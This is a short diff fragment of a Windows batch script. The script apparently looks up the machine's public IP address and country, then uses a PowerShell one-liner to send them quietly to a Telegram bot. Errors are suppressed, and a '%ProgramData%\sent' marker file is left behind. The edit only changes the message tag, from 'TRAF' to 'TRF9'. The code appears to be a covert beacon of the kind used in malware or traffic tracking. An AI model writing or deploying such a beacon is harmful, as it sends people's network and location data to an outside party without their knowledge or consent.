@@ -10,6 +10,6 @@ for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = 
     set "Country=%b"
 )
 
-powershell -NoProfile -Command "$msg = 'TRAF' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
+powershell -NoProfile -Command "$msg = 'TRF9' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
 echo done > "%ProgramData%\sent"
 endlocal
